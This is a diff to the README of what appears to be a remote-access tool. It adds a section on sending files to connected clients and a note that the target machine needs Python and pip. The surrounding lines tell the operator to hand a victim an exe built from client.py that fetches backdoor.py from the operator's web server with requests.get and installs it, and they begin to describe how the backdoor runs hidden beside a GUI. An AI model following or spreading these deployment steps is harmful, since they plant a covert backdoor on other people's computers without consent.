@@ -45,12 +45,21 @@ If you want to quit from your connection, type `quit` and then you'll be back in
 
 If you want to quit from the entire program type `shutdown` in the interactive prompt.
 ***
+## Sending files
+To send files to a client type in the interative prompt the following command
+`send`
+
+Then you'll get a list of all connection, select a connection by its number on the left side of connections table.
+after that you can choose between entering the path manually or by a file dialog, notice that the file dialog will create another window (Thats how tkinter file dialog works) don't close it or else you'll get some errors!
+***
 # Backdoor
 If you want to plant also a backdoor give the user an exe version of the **client.py** from the folder **"Multi client and backdoor"**.
 
 Upload the file **backdoor.py** to a server that you do a GET request to and change the address in **client.py** from 
 `request = requests.get("http://webserver.com/backdoor.py")` to
 `request = requests.get("%YOUR WEB SERVER ADDRESS%")`
+
+Make sure that the target computer have python 3 installed and pip or else the backdoor won't be installed.
 ## how the backdoor works
 When the user open the program (exe version of **client.py**) the program will have 3 processes:
 * The main process - The GUI
